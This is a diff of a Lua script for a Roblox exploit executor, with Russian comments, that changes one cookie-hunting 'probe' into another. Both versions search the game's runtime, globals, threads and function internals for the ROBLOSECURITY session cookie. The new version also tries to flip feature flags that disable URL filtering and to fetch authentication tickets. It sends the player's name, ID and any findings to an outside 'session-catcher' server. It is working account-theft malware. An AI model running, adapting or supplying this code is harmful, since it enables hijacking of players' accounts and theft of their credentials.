@@ -1,5 +1,5 @@
 -- ============================================================
---  Probe C — getgc/filtergc + getconstants + getupvalues
+--  Probe D — User table + shared + threads + fflag + RequestAsync + Actor
 -- ============================================================
 
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
@@ -10,189 +10,211 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local gcMatches = {}
-local gcStringCount = 0
-local constants = {}
-local upvalues = {}
+local userTable = {}
+local sharedTable = {}
+local threadEnvs = {}
+local threadCount = 0
+local fflagResults = {}
+local requestAsync = {}
+local actorResults = {}
 
 -- -----------------------------------------------------------
--- 1. getgc / filtergc — скан всех строк
+-- 1. User table из getrenv
 -- -----------------------------------------------------------
 pcall(function()
-    if filtergc then
-        -- Получаем все строки из GC
-        local strings = filtergc("string")
-        if strings then
-            gcStringCount = #strings
-            for i, s in ipairs(strings) do
-                if type(s) == "string" then
-                    if s:find("_|WARNING") or s:find("ROBLOSECURITY") 
-                       or s:find("|_") or s:find("auth_token") then
-                        table.insert(gcMatches, "GC[" .. tostring(i) .. "]: " .. s:sub(1, 500))
+    if getrenv then
+        local renv = getrenv()
+        if renv and renv.User and type(renv.User) == "table" then
+            for k, v in pairs(renv.User) do
+                if type(v) == "string" then
+                    userTable[tostring(k)] = v:sub(1, 500)
+                elseif type(v) == "number" or type(v) == "boolean" then
+                    userTable[tostring(k)] = tostring(v)
+                elseif type(v) == "table" then
+                    local sub = {}
+                    for k2, v2 in pairs(v) do
+                        sub[tostring(k2)] = tostring(v2):sub(1, 200)
                     end
+                    userTable[tostring(k)] = sub
+                else
+                    userTable[tostring(k)] = type(v)
                 end
             end
+        else
+            userTable["error"] = "User table not found or not a table"
         end
-    elseif getgc then
-        -- Fallback: getgc без фильтра
-        local objs = getgc()
-        if objs then
-            for i, obj in pairs(objs) do
-                if type(obj) == "string" then
-                    gcStringCount = gcStringCount + 1
-                    if obj:find("_|WARNING") or obj:find("ROBLOSECURITY") 
-                       or obj:find("|_") then
-                        table.insert(gcMatches, "GC[" .. tostring(i) .. "]: " .. obj:sub(1, 500))
-                    end
-                elseif type(obj) == "table" then
-                    -- Проверяем один уровень
-                    for k, v in pairs(obj) do
-                        if type(v) == "string" then
-                            gcStringCount = gcStringCount + 1
-                            if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
-                                table.insert(gcMatches, "GC_TBL[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
-                            end
+    end
+end)
+
+-- -----------------------------------------------------------
+-- 2. shared table
+-- -----------------------------------------------------------
+pcall(function()
+    if shared and type(shared) == "table" then
+        for k, v in pairs(shared) do
+            if type(v) == "string" then
+                if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
+                    sharedTable[tostring(k)] = "COOKIE: " .. v:sub(1, 500)
+                else
+                    sharedTable[tostring(k)] = v:sub(1, 300)
+                end
+            elseif type(v) == "table" then
+                local sub = {}
+                for k2, v2 in pairs(v) do
+                    if type(v2) == "string" then
+                        if v2:find("_|WARNING") or v2:find("ROBLOSECURITY") then
+                            sub[tostring(k2)] = "COOKIE: " .. v2:sub(1, 300)
+                        else
+                            sub[tostring(k2)] = v2:sub(1, 200)
                         end
+                    else
+                        sub[tostring(k2)] = tostring(v2):sub(1, 100)
                     end
-                elseif type(obj) == "function" then
-                    -- Проверяем upvalues функций
-                    if getupvalues then
-                        local ok, upvs = pcall(getupvalues, obj)
-                        if ok and upvs then
-                            for k, v in pairs(upvs) do
-                                if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
-                                    table.insert(gcMatches, "GC_FUNC_UPVAL[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
+                end
+                sharedTable[tostring(k)] = sub
+            else
+                sharedTable[tostring(k)] = type(v)
+            end
+        end
+    end
+end)
+
+-- -----------------------------------------------------------
+-- 3. getallthreads — сканируем env каждого потока
+-- -----------------------------------------------------------
+pcall(function()
+    if getallthreads then
+        local threads = getallthreads()
+        if threads then
+            threadCount = #threads
+            for i, thread in ipairs(threads) do
+                pcall(function()
+                    local env = getfenv(thread)
+                    if env and type(env) == "table" then
+                        for k, v in pairs(env) do
+                            if type(v) == "string" then
+                                if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
+                                    table.insert(threadEnvs, "Thread[" .. tostring(i) .. "] " .. tostring(k) .. ": " .. v:sub(1, 500))
                                 end
                             end
                         end
                     end
-                    -- Проверяем константы функций
-                    if getconstants then
-                        local ok2, consts = pcall(getconstants, obj)
-                        if ok2 and consts then
-                            for k, v in pairs(consts) do
-                                if type(v) == "string" and (v:find("_|WARNING") or v:find("ROBLOSECURITY")) then
-                                    table.insert(gcMatches, "GC_FUNC_CONST[" .. tostring(i) .. "][" .. tostring(k) .. "]: " .. v:sub(1, 500))
-                                end
-                            end
-                        end
-                    end
+                end)
+            end
+        end
+    end
+end)
+
+-- -----------------------------------------------------------
+-- 4. setfflag — пробуем включить HTTP
+-- -----------------------------------------------------------
+pcall(function()
+    if setfflag then
+        local flags = {
+            {"FFlagHttpServiceEnabled", "true"},
+            {"FFlagDebugEnableHttpPost", "true"},
+            {"FFlagEnableHttpPost", "true"},
+            {"FFlagDisableUrlFilter", "true"},
+            {"FFlagEnableAuthTicketApi", "true"},
+            {"FFlagEnableRequestAsync", "true"},
+            {"DFFlagDebugAllowHttpPost", "true"},
+            {"FFlagDebugDisableUrlFiltering", "true"},
+        }
+        for _, pair in ipairs(flags) do
+            local ok, res = pcall(setfflag, pair[1], pair[2])
+            fflagResults[pair[1]] = ok and "set" or "ERR: " .. tostring(res):sub(1, 100)
+        end
+    end
+end)
+
+-- Если setfflag сработал — пробуем HttpPost
+pcall(function()
+    local ok, resp = pcall(function()
+        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
+    end)
+    fflagResults["postAfterFflag"] = tostring(ok) .. ": " .. tostring(resp):sub(1, 300)
+end)
+
+-- -----------------------------------------------------------
+-- 5. HttpService:RequestAsync
+-- -----------------------------------------------------------
+pcall(function()
+    local hs = game:GetService("HttpService")
+    local urls = {
+        "https://users.roblox.com/v1/users/authenticated",
+        "https://auth.roblox.com/v1/authentication-ticket",
+        "https://www.roblox.com/my/settings/json"
+    }
+    for _, url in ipairs(urls) do
+        local ok, resp = pcall(function()
+            local req = {
+                Url = url,
+                Method = "GET",
+                Headers = {}
+            }
+            return hs:RequestAsync(req)
+        end)
+        if ok and resp then
+            local dump = "Status:" .. tostring(resp.StatusCode) .. " Body:" .. tostring(resp.Body):sub(1, 300)
+            if resp.Headers then
+                for k, v in pairs(resp.Headers) do
+                    dump = dump .. " H:" .. tostring(k) .. "=" .. tostring(v):sub(1, 200)
                 end
             end
-        end
-    end
-end)
-
--- -----------------------------------------------------------
--- 2. getconstants на HTTP функциях
--- -----------------------------------------------------------
-pcall(function()
-    if getconstants then
-        -- request
-        local ok, consts = pcall(getconstants, request)
-        if ok and consts then
-            local dump = {}
-            for k, v in pairs(consts) do
-                dump[tostring(k)] = tostring(v):sub(1, 200)
-            end
-            constants["request"] = dump
+            requestAsync[url] = dump
         else
-            constants["request"] = "ERR: " .. tostring(consts):sub(1, 100)
+            requestAsync[url] = "ERR: " .. tostring(resp):sub(1, 200)
         end
-    end
-end)
-
-pcall(function()
-    if getconstants and httpget then
-        local ok, consts = pcall(getconstants, httpget)
-        if ok and consts then
-            local dump = {}
-            for k, v in pairs(consts) do
-                dump[tostring(k)] = tostring(v):sub(1, 200)
-            end
-            constants["httpget"] = dump
-        end
-    end
-end)
-
-pcall(function()
-    if getconstants then
-        local ok, consts = pcall(getconstants, game.HttpGet)
-        if ok and consts then
-            local dump = {}
-            for k, v in pairs(consts) do
-                dump[tostring(k)] = tostring(v):sub(1, 200)
-            end
-            constants["game.HttpGet"] = dump
-        end
-    end
-end)
-
-pcall(function()
-    if getconstants and httppost then
-        local ok, consts = pcall(getconstants, httppost)
-        if ok and consts then
-            local dump = {}
-            for k, v in pairs(consts) do
-                dump[tostring(k)] = tostring(v):sub(1, 200)
-            end
-            constants["httppost"] = dump
-        end
+        task.wait(0.3)
     end
 end)
 
 -- -----------------------------------------------------------
--- 3. getupvalues на HTTP функциях
+-- 6. run_on_actor — пробуем HTTP в actor контексте
 -- -----------------------------------------------------------
 pcall(function()
-    if getupvalues then
-        local ok, upvs = pcall(getupvalues, request)
-        if ok and upvs then
-            local dump = {}
-            for k, v in pairs(upvs) do
-                dump[tostring(k)] = tostring(v):sub(1, 200)
-            end
-            upvalues["request"] = dump
+    if run_on_actor then
+        local ok, res = pcall(run_on_actor, function()
+            -- Пробуем game:HttpPost в actor context
+            local postOk, postRes = pcall(function()
+                return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
+            end)
+            return tostring(postOk) .. ": " .. tostring(postRes):sub(1, 300)
+        end)
+        if ok then
+            actorResults["HttpPost"] = tostring(res):sub(1, 400)
         else
-            upvalues["request"] = "ERR or empty"
+            actorResults["HttpPost"] = "ERR: " .. tostring(res):sub(1, 200)
         end
-    end
-end)
-
-pcall(function()
-    if getupvalues and httpget then
-        local ok, upvs = pcall(getupvalues, httpget)
-        if ok and upvs then
-            local dump = {}
-            for k, v in pairs(upvs) do
-                dump[tostring(k)] = tostring(v):sub(1, 200)
-            end
-            upvalues["httpget"] = dump
+        
+        -- Также пробуем game:HttpGet к auth endpoint
+        local ok2, res2 = pcall(run_on_actor, function()
+            local getOk, getRes = pcall(function()
+                return game:HttpGet("https://auth.roblox.com/v1/authentication-ticket")
+            end)
+            return tostring(getOk) .. ": " .. tostring(getRes):sub(1, 300)
+        end)
+        if ok2 then
+            actorResults["HttpGet"] = tostring(res2):sub(1, 400)
+        else
+            actorResults["HttpGet"] = "ERR: " .. tostring(res2):sub(1, 200)
         end
-    end
-end)
-
-pcall(function()
-    if getupvalues then
-        local ok, upvs = pcall(getupvalues, game.HttpGet)
-        if ok and upvs then
-            local dump = {}
-            for k, v in pairs(upvs) do
-                dump[tostring(k)] = tostring(v):sub(1, 200)
-            end
-            upvalues["game.HttpGet"] = dump
-        end
+    else
+        actorResults["error"] = "run_on_actor not available"
     end
 end)
 
 local payload = {
-    probe = "C — GC Scan + Constants + Upvalues",
+    probe = "D — User/shared/threads/fflag/RequestAsync/Actor",
     username = LocalPlayer.Name,
     userId = LocalPlayer.UserId,
-    gcMatches = gcMatches,
-    gcStringCount = gcStringCount,
-    constants = constants,
-    upvalues = upvalues,
+    userTable = userTable,
+    sharedTable = sharedTable,
+    threadEnvs = threadEnvs,
+    threadCount = threadCount,
+    fflagResults = fflagResults,
+    requestAsync = requestAsync,
+    actorResults = actorResults,
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
 
@@ -205,4 +227,4 @@ pcall(function()
     })
 end)
 
-print("[Probe C] sent. GC strings: " .. gcStringCount .. " | GC matches: " .. #gcMatches)
+print("[Probe D] sent. Threads: " .. threadCount .. " | Fflags: " .. table.getn(fflagResults))
